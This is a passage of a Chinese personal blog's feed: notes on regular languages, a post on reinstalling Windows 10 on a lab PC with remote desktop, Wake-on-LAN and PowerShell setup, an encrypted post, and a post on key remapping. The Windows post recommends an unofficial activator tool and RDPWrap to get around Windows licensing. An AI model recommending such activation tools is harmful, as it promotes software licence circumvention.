class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span></p><h3 id="推论4-1"><a class="markdownIt-Anchor" href="#推论4-1"></a> 推论4-1</h3><p>正则表达式与FA、正则文法等价,是正则语言的表示模型</p><p><img src="https://upyun.wuuconix.link/image-20211111190843956.png" alt="等价模型之间的转化" /></p><p><img src="https://upyun.wuuconix.link/image-20211111191011839.png" alt="转化" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>专业课</tag>
      
      <tag>FA</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验室机器安装Windows 10记录</title>
    <link href="/2021/10/23/windows10/"/>
    <url>/2021/10/23/windows10/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-jaLOZfhn" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1436910579" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>昨天将实验室的主机重装成win10了。现在我就是在实验室远程连接寝室的笔记本来写博客。</p><p>在配置好远程连接并且深刻体会到远程带来的方便与快捷后，我已经离不开它了。</p><p>进入实验室也快半年了，就没来过几次2333，我觉得很大部分原因是，每次来实验室都要备上沉重的笔记本。</p><p>有时候突然想要去实验室了，但是想到要拿笔记本，拿充电器，拿键盘，拿鼠标，背着沉重的包走过来。想想就放弃了。</p><p>于是昨天我打算把用了快3个月的Ubuntu Server刷成win10，这样就能不用带笔记本了，而远程连接。或者不远程，直接用实验室的主机也能干很多事了。不像以前，如果什么都不带就来实验室，虽然有屏幕，有主机，但是打开屏幕，里面只有命令行，字体还没有显示完全2333。</p><p>但是我对过去3个月的实验室主机的Ubuntu Server是十分满意的，我已经很久没有用wsl了，因为只要一句ssh命令就能连接到实验室主机。我也不用在笔记本上开着Dokcer for Desktop，忍受它轰鸣的风扇声了。这让我感受到了一台实体Linux主机的好处。</p><p>但是慢慢得，我购买了两台云服务器，貌似实验室主机的工作云服务器也能胜任。</p><p>实验室的主机也长期处在性能过剩的情况，毕竟linux机器资源占用本来就少。一开始开了很多docker服务，之后因为使用不频繁，也删掉了许多。</p><p>我也意识到，如果以后要打比赛的话，还是得用wsl，因为到时候可能会断网。</p><p>这一些因素都让我决定重装系统。</p><h2 id="下载微软最新iso镜像"><a class="markdownIt-Anchor" href="#下载微软最新iso镜像"></a> 下载微软最新ISO镜像</h2><p>我的u盘里装着ventory，它可以在机器u盘启动的时候，选择众多iso文件中选择一个进行启动。</p><p>所以我只需要下载windows 最新的iso文件即可。</p><p>我们在搜索引擎上搜索关键词后发现了这个网址。 <a href="https://www.microsoft.com/zh-cn/software-download/windows10">https://www.microsoft.com/zh-cn/software-download/windows10</a></p><p>结果发现狗比微软官网只提供了下载工具而没有直接下载iso镜像的选项。</p><p><img src="https://upyun.wuuconix.link/image-20211023105412679.png" alt="下载工具" /></p><p>后来发现只要改为手机端的UA即可，edge浏览器直接在F12里点一下一个切换按钮即可以各种手机端ua进行模拟。切换后刷新一下界面，就能看到页面变成了iso下载界面啦！</p><p><img src="https://upyun.wuuconix.link/image-20211023105636856.png" alt="iso" /></p><p>这里提供了两个选择，<code>windows 10</code>和<code>windows 家庭版</code>。第一个我怀疑是专业版。但是为了保险起见，我选择了熟悉的家庭版。</p><p>之后就是正常u盘启动然后重装啦，不多说了。</p><h2 id="激活windows"><a class="markdownIt-Anchor" href="#激活windows"></a> 激活windows</h2><p>因为这台主机肯定是没有自带激活的，不像我们的笔记本，出场的时候有正版windows会自动激活。</p><p>这里我使用了github上的一个工具。十分好用，将这个windows数字激活了，应该是永久的，因为不是以kms方式。</p><p>软件链接 <a href="https://github.com/zbezj/HEU_KMS_Activator">https://github.com/zbezj/HEU_KMS_Activator</a></p><h2 id="rdpwrap找不到对应rdpwrapini"><a class="markdownIt-Anchor" href="#rdpwrap找不到对应rdpwrapini"></a> rdpwrap找不到对应rdpwrap.ini</h2><p>安装完系统后第一件事我就开始着手远程连接，因为能在实验室外面连接主机也是一件非常重要的事情。</p><p>然后用RDPWRAP发现找不到我的系统版本的<code>rdpwrap.ini</code>。我记得当时的版本号是<code>10.0.19043.789</code>。</p><p>我非常郁闷，想明明是微软官网下的最新iso镜像安装的系统，不至于找不到ini啊。</p><p>后来我更新了一下系统就好了2333。</p><p>原来更新是会变版本号的（</p><p><img src="https://upyun.wuuconix.link/rdp%20configure.png" alt="rdp configure" /></p><p>更新后版本号的数值下降了，这个版本就很容易在github上找到对应ini文件了。</p><h2 id="配置powershell-oh-my-posh"><a class="markdownIt-Anchor" href="#配置powershell-oh-my-posh"></a> 配置Powershell Oh-My-Posh</h2><p>配置完远程连接，我便着手开始美化Powershell，装个Oh-My-Posh。</p><p>简单来说，Oh-My-Posh就是和Linux里Oh-My-Zsh一样的存在。</p><p>这是vaala的配置文档。<a href="https://docs.vaala.cloud/s/C4JK2n9-J">https://docs.vaala.cloud/s/C4JK2n9-J</a></p><p>这是vaala很久之前写的了，现在仍然适用。</p><p>但是随着windows官方包管理工具<code>winget</code>的出现，vaala文档中利用第三方包管理工具choco的步骤可以用winget来代替。</p><ol><li><p>让powershell使用<code>sudo</code>，可以用winget安装gsudo这个工具。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">winget install gsudo -e <span class="hljs-comment">--rainbow</span><br></code></pre></td></tr></table></figure></li><li><p>git也可以用winget来安装</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">winget install Git<span class="hljs-selector-class">.Git</span> -e <span class="hljs-attr">--rainbow</span><br></code></pre></td></tr></table></figure></li></ol><p>然后我将vaala的powershell配置文件精简了一下，去掉了我平时用不到的功能。虽然每次启动powershell还是很慢（</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> posh<span class="hljs-literal">-git</span> <br><span class="hljs-built_in">Import-Module</span> <span class="hljs-built_in">oh</span><span class="hljs-literal">-my-posh</span> <br><span class="hljs-built_in">Import-Module</span> <span class="hljs-built_in">Get-ChildItemColor</span><br><br><span class="hljs-built_in">Set-PoshPrompt</span> <span class="hljs-literal">-Theme</span> M365Princess<br><br><span class="hljs-variable">$env:PYTHONIOENCODING</span>=<span class="hljs-string">&quot;utf-8&quot;</span><br><br><span class="hljs-comment"># Remove curl alias</span><br><span class="hljs-keyword">If</span> (<span class="hljs-built_in">Test-Path</span> Alias:<span class="hljs-built_in">curl</span>) &#123;<span class="hljs-built_in">Remove-Item</span> Alias:<span class="hljs-built_in">curl</span>&#125;<br><span class="hljs-keyword">If</span> (<span class="hljs-built_in">Test-Path</span> Alias:<span class="hljs-built_in">curl</span>) &#123;<span class="hljs-built_in">Remove-Item</span> Alias:<span class="hljs-built_in">curl</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GoBack</span></span> &#123;<span class="hljs-built_in">Set-Location</span> ..&#125;<br><br><span class="hljs-comment"># Remove-Item alias:ls -force</span><br><span class="hljs-built_in">Set-Alias</span> l <span class="hljs-built_in">Get-ChildItemColor</span> <span class="hljs-literal">-option</span> AllScope<br><span class="hljs-built_in">Set-Alias</span> <span class="hljs-built_in">ls</span> <span class="hljs-built_in">Get-ChildItemColorFormatWide</span> <span class="hljs-literal">-option</span> AllScope<br><br><span class="hljs-built_in">Set-Alias</span> open <span class="hljs-built_in">Invoke-Item</span><br><span class="hljs-built_in">Set-Alias</span> .. GoBack<br><br><span class="hljs-built_in">Set-PSReadlineKeyHandler</span> <span class="hljs-literal">-Key</span> Tab <span class="hljs-literal">-Function</span> Complete <span class="hljs-comment"># 设置 Tab 键补全</span><br><span class="hljs-built_in">Set-PSReadLineKeyHandler</span> <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;Ctrl+d&quot;</span> <span class="hljs-literal">-Function</span> MenuComplete <span class="hljs-comment"># 设置 Ctrl+d 为菜单补全和 Intellisense</span><br><span class="hljs-built_in">Set-PSReadLineKeyHandler</span> <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;Ctrl+z&quot;</span> <span class="hljs-literal">-Function</span> Undo <span class="hljs-comment"># 设置 Ctrl+z 为撤销</span><br><span class="hljs-built_in">Set-PSReadLineKeyHandler</span> <span class="hljs-literal">-Key</span> UpArrow <span class="hljs-literal">-Function</span> HistorySearchBackward <span class="hljs-comment"># 设置向上键为后向搜索历史记录</span><br><span class="hljs-built_in">Set-PSReadLineKeyHandler</span> <span class="hljs-literal">-Key</span> DownArrow <span class="hljs-literal">-Function</span> HistorySearchForward <span class="hljs-comment"># 设置向下键为前向搜索历史纪录</span><br><span class="hljs-built_in">Set-PSReadLineKeyHandler</span> <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;Ctrl+f&quot;</span> <span class="hljs-literal">-Function</span> ForwardWord<br><span class="hljs-built_in">Set-PSReadLineOption</span> <span class="hljs-literal">-PredictionSource</span> <span class="hljs-built_in">History</span><br><br><span class="hljs-built_in">Set-PSReadLineOption</span> <span class="hljs-literal">-Colors</span> <span class="hljs-selector-tag">@</span>&#123;<br>  InlinePrediction         = <span class="hljs-string">&quot;#acacac&quot;</span><br>&#125;<br><br>[<span class="hljs-type">System.Console</span>]::OutputEncoding=[<span class="hljs-type">System.Text.Encoding</span>]::GetEncoding(<span class="hljs-number">65001</span>)<br></code></pre></td></tr></table></figure><h2 id="实现远程唤醒"><a class="markdownIt-Anchor" href="#实现远程唤醒"></a> 实现远程唤醒</h2><p>这台机器非常神奇，它bios和windows 网卡的设置貌似都是默认支持wol的。我第一次试就成功了。相比之下，可怜的smooth的联想拯救者y7000 2019的bios里连个wol的选项都没有。</p><p>然后因为实验室主机的是连在路由器下的，不是直接连着校园网，要想实现校园网内唤醒，势必需要端口转发。</p><p>之前试过，用dmz，直接将主机的所有端口全部转发的话，是能够实现唤醒的，但是因为vaala有个猫盘连接着我的路由器，我就不能用dmz了。</p><p>实际上也非常简单，因为魔术包的发送都是用的udp的9号端口，只要在路由器里转发一下就行。</p><p><img src="https://upyun.wuuconix.link/image-20211023112809110.png" alt="udp" /></p><p>注意一定要选为udp，tcp的9号端口是不行的。</p><h2 id="漂亮的桌面展示"><a class="markdownIt-Anchor" href="#漂亮的桌面展示"></a> 漂亮的桌面展示</h2><p>实验室主机本身的壁纸。这个壁纸我非常喜欢。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h2b97ntpsjj31hc0u04qp.jpg" alt="win10" /></p><p>以下是远程连接我的笔记本，win11原皮yyds！</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h2b97zczwqj31hc0u01e8.jpg" alt="win11" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>wol</tag>
      
      <tag>远程连接</tag>
      
      <tag>win10</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>武丑兄杂想——2021年10月21日</title>
    <link href="/2021/10/21/think1/"/>
    <url>/2021/10/21/think1/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，密码貌似不对" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="38c781ba2647477756aa5012e0266f332a9b2601c959205f1478c49015ac7708">7a3267739b74cd0745ebbdd80f3ae6d59e8f7fa0a744d2e6481cd4de61931fff432efa3f366af4545eccea5fdd5b22a8c5580367693f0df240ffc39ecad5c93c1f0861d5730920ab5cd8eb8a247713a40d6518958e76c571622d3f765cc5de46a870e7f1a0ef2c10f946c3495716dc326ba992e5154712141777d65231cb76e3054153df3fba2900087dc396ec4d8f5057a0f1154cff2d8c8f87c62e6009b570178604cea98a796b9f2a1b2519d34abc2d44e3b141bafe04cbb796981ba2150ba9a968c4a8ae974d6bd0c81e71593df01aab61d60677eae647b6930d8dc7a09618834151fb9dbf665eb8626564c6b90358526ef3b7934417a0efd25fda77a3a7bbabcc681ea8551fa2f211ca7118aac451b78d2ca4c36754204a763275bcd5d173d3766d63a0cf2d0b26eb0ee03b931be03ab4e2a596fda79e2fc0d638b7832f86fb55e1171bd48d89099cb5b997f3f1a47f8fd288f6e274d236004900ead947fb1b7053e9db3136a6c64d870e1178fd8c2a373d142bea739193dc8e294549482cb56a28030c6c85da0c9858a3c1a6413d6d341b6f465044638a0f2983e46b23405a1b58ab30107ff33be0af0d2a47d874c4ca5dc8deef6bb51a6d5b4609d6d06065974d9ac75826364900f3881a5db219d0cb9ecc8103a458ba199040b4444a3181bf4464d0391e1041511a15023ab307bd1c4338eb335144602b72ef2807432c0daefa5392e4f132aaba559b2b5ae2a80fe61f4069b39ed0025a917b6edfbda3515bf652d6925102380dff94ed6849fec2951b406f8aa4e6aca0cb21806e44579f0ca562f1855fcfa8ff2ea20dd26ce718dadd435cd64f0dfea13230dd47812620e716572e1bbdee181c28bf86519a980b6b60cbb9e47c89a584ae2b1a4c638d0af1bfe262af5c851d1c5b6a9a97ffb0c1c7995d61412584dbd81811884ecb32673dd16857e990cf80ac86b925e11d159064f8144449bdf45582cba145ade490be3427beb1c216229a2650504725363e83c704bb970eba922b22ab0bf3b6bfbd4803b6c566b129c1c26fd9395a1b96c64aa6cf808207d098e4b58c0428487b5124091224ed373ed989a17e2174fc24a27492f0a8ac899bd8b0d9e776dd8afd88e6ed4b6a38ccd7280d73f2a2b74aec9e16147b456c6c170608997023122875ec492aaeb0500ffba088dba5cb00480c2ec3ef20e086839d949e6649d4d4fff8310f561f220dc65f464c80e52c81a93391694463fb2c7d8db92708fa1e298ba921a72e2e03ca91b98dc381c65714f851d2eaaa522be7695adf7c79901f1a891f268ea020b616dfee4968fbee1894667a61d5e3fd1723997a744667ac39b4948f22caf75f9d668d9c92e5e4d54a35d6283e1abe9761ebdd4ee0ec9639db123dbb3cdfea7f7ff99db8f23a5f9c27705f97dd0a8d2f67618ed0d181df65101ef8e463ea5ea2815599d0300768ef1891bdb8a510abf755933736c64435636dbfbe7d8c0ca07645880501140f94980ba6bae5cac68763773703eb94ff33ae4e996f8121861576e34e7d4016a8b6eea3bf702b4de7f78d2bb5e3dd89e4f318d12ab1f09d4f96f88c806487943e2de0090ec36a312fae8dc79bdea2374bf6d3ea4cd9ca4c78f1b21c006c7c293656760b4fd1acec53d998f54f45e3a0134f530a81c0d3fd89a0f253ec145fcfd411443de4ca93e2826f2721d1d5bd04c5f67d4dbbc1def740d37197e2e50a8c5fc1a88d014e9a4b17765e8161a0ad8fa9adb9f78cfb28a48da029b8362a954f22744f20f27e0fb0d9052d76753aca98f4c49aa47924a89e15c299eecf037128e0ca62d1b7e834f71d70567f7c42c56e0916831826cf6605a4adde60e2312e89ee2b4788c3e6cf0eaadba3c904efbf1d383e7235bca7aa3356059e6fa0516e8ce71db02dd0e3a398daff4d101547ab55db2a45d5a46a0a59c675c1dfa73a87a8589541cd6f6de5b36fc8ae20720a5b73830ea8b204123b31751e8e236b1e86709a7eed0b1bfaf81fbcd924650aa463037653754ec7fdba647efaa5b39b38dadd1e8f3fde62123c996f8085e3ec22cbc9501fabb1759b574148cbbfa14869c8215b2b81aeff9709d336eddc766df898a44badbe839e01633625b8964faf540aeb8726c28f64154b555712e39c40ca561f3dbdaaa010179ab5ebb3accbc0c79d2cb0ef60c9a7998660aeadaa81f7368e475c8c8acae3a20afc5707100bd7739a75d5c0b8583373ca0267a089fd293396cfba7cfa76cf067be099d69650f13a140a50ce4b011c73855df6f7c765a391cd0feca049a56ca169695851becfc3011591989d90a7438d3b7356e06aed0884e2ad591f0ad7700c11511aeb9406b1691c11d54da5cc551ea44df8ddc1459ea86c6b6801e3cb3d0e1b4cdcc9075bcc83321c18b316c4e2148b6b04e0c96bf93fd3bb87eaa62cf41e6f82771d2b6d55161d931921d379d26b6a72a197630cc7fc5d6938515cb4a3457bc09e2339a6035696f4bc036860c14f85f7f6fa897d474e46b988e9c3b41534773f17c6da0fd4d0ed6665ba4edf8ea7059549db1cf405c6801e4d78a1c9c1518634f671e75582ac0ddf253caccfc971c8d73276d88a636944367d382cdfd68bfe7aa633cc615c3a771dea07adeee5b6b9da64c05c72a372244d04ba6e2537ffd3c69548092bb8834d081df2a5532204be552c663a4f7d33155067881863e1c0cc5d9fefcafda20af42e02f0c39078efdfaad4b7161af7b0fe653e11079b64dada901c28b06c6b02094bc0dfe2f6d9c5cacf7abdeaf2c8f6520a46e99fb1c82fd46ee0cd63ffea8164eccdecd490519f1f528b24b10e19088398ee05fcb6200044e9225952a4de7d89c357cb70b57e30a01af611a983ed1835ea19469b7cec492eb10420281b988c9b3199ee3c69f52847a9f93739a9f963c9ed27c11c009658569532f6cf5452de0462498f307ffced5ef6cdc0bd70c7b737373100459a4c649ce5190c5cdeea3c112e59ca5e7b281a53e7debcf4f8f06f5520f78877502c764bf537bf2556fefbc728e41c5991c87e085fe6e9bc900fbd5da36fb1fdbea67e80d0b918e5b6efcbce9f7121fb00cec9f52a1f71ddcbd61684ff51debc4d7971be1cb26b83c4a6247f1595779bf924f884d3cf3ab2bbcff0519af8c01ac50fd8c9ebfaeac46c84228b2e792da358054ef2a0c7d0b274d334e2c533d918205b20308ad1e8a14f078f589b1d1b57aa69d3f0aa2a76e8cd2b672d8d3fd9275a521ca590370b97fd6b09dffd821f1017281551d271f9adb6b644f2f34ed3de590e15bc52ecb0dcc1313d678911bf8596894ea5eb104fa54b00c77f70a9a538a8c35cd7b6363b6a17ad783754b2d88aea12de6564161c57922d3f2eb397c3ec4db2924a17f2b5086a9ad2dd66314f87166e3f502d8e56ca92a40d3af9c20ec32c66a80735e17f3a6ae0be549c6090c727de196f7f912ffbbf716e23aa9ce26514379e086eae482cfb5711e47862b84f969f26ec49bb2a1161c399357d3feca2d763e612b2f755455aee7b9834362a125ce23df90e5cfd2d21bfc314a150c9bc06cc5924b8484c48695d0cdc98f6f7f630e308e5a237e62572df1fe1e2d93c08688326a95ec84a2571f2cbee69ce136bde2c5b51521cf722dbef1a707cacefa5da04ae870235570cdd9f0e204a4c474dcc834e7e82282d9e92c211995774ca7cfac69165f0bfadbe7a5c45ea6f7ba5192b1fbe8861a31c8804d2df4263575c709cadf5aae5ba4a08e31d35932467019768ace241190e8459ad5de5688b4f4bb63f03e08f991e1ced7c5ae64290c2710e3d01e28e70a2fd3756d8efd27e86754c01e09588328fb2758804bfa7c22dad68457415e51d2902f2a1f20cf1fcd01e929d1103a4595506324ed5b054a1dff30fe3259b97e037519930fe0f79ccace87e7eb6cf1f24f5b66e708d78d9d406e8288fc62eec70903c1f860c96defc2e4742ed503b4450862567a4b26b652f02be46eee4148a26728693a0bea1a71bc6f44aeb4894f717dd6c49095b6e2d95def94a1b0dfa803c47e1c38584e7a0a88a1e92715e1a36c63c80a7a8c9d65588b3c4908772e61bb412e3d6e3d49472151e3ed67639edad68db439f8fdfdf390cbd584cd244760eb94ab7b2fd59f0d36504803d0cccbcbff12d3e2c4e270600e756de712c3a5ca5cac6368025df3634e919c51cc770e1522484edb2136aed8e188b2687ec1646f16c23c9394e24765b24d7a3431d4f9d1755cb8db090ea1df5599e888d3f2c0e37dd369b23be837b8141b62c6effb159823c0e1faba8dd9d8c93b55de5a36da405d2f4b0187bf87ba02fc06f89d139b801da30520db2755a26775af65f47223ff6d3ecea31167bd1c04892db599503062fc1b6938f1c7e6ff585b55c7d888e032ace7767e1aa9ff99d10ee508eaceb8007a22b5c96227646c88e3a3ac1eec89e3dd7cce981fe3869c29748260bb4fdc403aff1c2cab94b8687f9f8e232da30b36a91142b31266622ae0453a94a4b12d8fad83a94d6f0d37d04466afb9a5d905c55e2243e409c9ebf74dbcc5869e0779a710c5c687128bb07a9941cdbeae575f45000c8280e7685c3a320e856b6caa03e8d335ee59977d86f3901ff443ca5fa84bdae319086a22953cdb130ca17ec6bdb039891635d039fc6bce397544afb86c85cbc1f12181a218160b49ebcf7032a365a29ce3318bed616fd216bce5c95c2793f0f401f4eaff2b669736d11c941b8b99c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">武丑兄需要你的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>胡思乱想</tag>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在远程连接中实现win键和alt+tab快捷键</title>
    <link href="/2021/10/14/win-shortcut/"/>
    <url>/2021/10/14/win-shortcut/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-EDNMmrAZ" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="28784433" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>最近去上课总是带着个平板和蓝牙键盘就去了，十分轻便。</p><p>平板上用的远程连接软件主要是<a href="https://superdisplay.app/">SuperDisplay</a>。这款软件可以让你的平板变成电脑的一块第二屏幕。这款软件我已经使用了很久了，在之前很久一段时间内我我只是把它当作&quot;一块副屏&quot;来使用，由于它与笔记本的连接是通过数据线的，以至于它的显示效果极佳。</p><img src="https://sina.wuuconix.link/large/007YVyKcly1h2b966uylaj31400u0tg6.jpg" alt="摄于2021年8月21日" style="zoom:67%;" /><p>直到9月份的某一天，我突然想到superdisplay还有wifi连接的功能，它的效果会怎么样呢？</p><p>效果出乎意外的好，在我的老古董小米平板1的性能调为<code>power save</code>并且开启省电模式的情况下，都极为流畅。同时由于该软件的设计初衷是用于画家在第二屏幕上用笔画画的，它支持平板的多点触控，相当于我拥有了一块真正的触摸屏。而不是微软官方远程连接<code>RD Client</code>中寒碜的模拟触控。</p><p>由于支持了多点触控，我们便可以使用windows store中的<code>Gesture Sign</code>这款软件来增强windows下手势的功能。</p><img src="https://upyun.wuuconix.link/image-20211014162841239.png" alt="Gesture Sign手势" style="zoom:67%;" /><p>比如我设置了双指分别上下左右滑动，可以实现音量条件和左右键的功能，这在看视频的时候提供提供很大的帮助。</p><p>然后我还设置了三指同时点击来唤出屏幕键盘（windows11的屏幕键盘十分好看。</p><img src="https://upyun.wuuconix.link/image-20211014163059350.png" alt="屏幕键盘" style="zoom:67%;" /><p>平常在床上刷哔哩哔哩，需要回个消息或者发个弹幕的时候，就可以三指唤出屏幕键盘来输入，十分优雅。</p><p>然后在上课进行远程连接的的时候，因为我会带上我的罗技K380，打字就不需要屏幕键盘了，直接实体键盘即可。但是有一个情况下我得用屏幕键盘，那就是用windows快捷键的时候，这也引出了这篇文章的要解决的核心问题。</p><h2 id="windows键alttab无法映射的问题"><a class="markdownIt-Anchor" href="#windows键alttab无法映射的问题"></a> windows键，alt+tab无法映射的问题</h2><p>由于系统底层的原因，一般来说，一个蓝牙键盘连上一个安卓手机或者平板后，键盘上的windows键都是有具体功能的。</p><p>比如在我的小米平板1上(系统为lineageos 16)</p><img src="https://upyun.wuuconix.link/Screenshot_20211014-164449_.png" alt="图中的放大镜就对应罗技k380上的windows键" style="zoom: 50%;" /><p>相当于这个键是系统层面的快捷键了，导致在远程连接的时候无法正确传递<code>Windows</code>键。这对我来说特别挺难受的，因为我习惯使用许多windows快捷键。</p><img src="https://upyun.wuuconix.link/image-20211014165427235.png" alt="windows快捷键" style="zoom:67%;" /><p>比如<code>win+E</code>打开资源管理器和<code>win+D</code>回到桌面。</p><p>此外非常用的快捷键<code>Alt+Tab</code>也无法在远程连接的时候正常使用。因为安卓系统也认识这个命令，它会去切换app，而达不到在windows里切换程序的效果。</p><img src="https://sina.wuuconix.link/large/007YVyKcly1h2b96raduej31kw16okjl.jpg" alt="alt+tab" style="zoom: 50%;" /><p>这两个问题在几个月前我就试图解决，当时想在平板上下功夫，去更改它的底层按键映射。最后无疾而终。</p><h2 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h2><p>今天下午上科幻电影赏析选修课的时候闲来无事，又想到了这个问题，突然联想到7att1ce之前推荐的<code>PowerToys</code>貌似有按键映射的功能。</p><p>下载后，发现效果非常好，由于个人习惯的原因，键盘上的右alt和右ctrl平时我根本不用。我便将<code>Alt(Right)</code>映射为<code>Win</code>。将<code>ctrl(Right)</code>映射成<code>Alt</code>。</p><p>这样<code>Alt(Right)</code>就成为了一个win键，可以进行快捷键操作。<code>Ctrl(Right)+Tab</code>就实现了<code>alt+tab</code>的功能。</p><p><img src="https://upyun.wuuconix.link/image-20211014191753837.png" alt="页面极其美观的PowerToys" /></p><p>同时由于改的是Windows层面的按键映射，RD Client用户也能实现一样的效果。</p><h2 id="演示视频"><a class="markdownIt-Anchor" href="#演示视频"></a> 演示视频</h2><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=721121062&bvid=BV1KQ4y1z73o&cid=425010337&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>远程连接</tag>
      
      <tag>powertoys</tag>
      
      <tag>按键映射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>校园网内简易p2p文件分享平台的手动实现</title>
    <link href="/2021/10/12/ajax/"/>
    <url>/2021/10/12/ajax/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-tXmbXBuu" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="26379178" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>开学一个多月了，由于繁重的学业和懒惰，都没怎么更新有意思的博客。</p><p>前几天突然想到了一个想法。同学之间平常用网络分享一个文件，大部分都是用的qq。但是qq看起来把文件拖到聊天框点击发送就发给对面同学了。但是实际上是先上传到了腾讯的服务器，然后对面的同学再从服务器上下载。</p><p>这一上传一下载就很耽误时间。我就想在我的电脑上开一个文件上传服务，别的同学直接上传到我的机械革命上，上传完毕，我就得到了这个文件，不用再下载一遍。而且由于是校园网内的服务，速度也有保障。</p><h2 id="语言选择"><a class="markdownIt-Anchor" href="#语言选择"></a> 语言选择</h2><p>由于前几天做了几道python flask模板注入的题目，便打算拿flask来当后端练练手，提供http服务。</p><p>前端的话还是利用漂亮且方便易用的<a href="https://fomantic-ui.com/">fomantic-ui</a>解决html和css样式问题，再配合上大大简化js编程的<code>Jquery</code>来写效果和功能。</p><h2 id="遇到的困难"><a class="markdownIt-Anchor" href="#遇到的困难"></a> 遇到的困难</h2><p>单纯的文件上传十分简单。对付小文件还好，但是大文件就会出现页面停滞的情况，而用户收不到任何反馈，不知道到底是在上传还是崩溃了。我们需要设置一个上传进度条来给以用户友善的提示。所以这里就有一个问题，如何获得上传的进度？</p><p>查询资料过后，我发现<a href="https://www.cnblogs.com/lliuhh/p/7510401.html">XMLHttpRequest</a>能够获取进度。然后我又发现<code>Jquery</code>中封装的<code>$.ajax</code>能够更加简单的实现。参考链接 <a href="https://stackoverflow.com/questions/13203231/is-there-any-way-to-get-jquery-ajax-upload-progress">https://stackoverflow.com/questions/13203231/is-there-any-way-to-get-jquery-ajax-upload-progress</a></p><h2 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h2><p><img src="https://upyun.wuuconix.link/image-20211013002334616.png" alt="文件目录" /></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 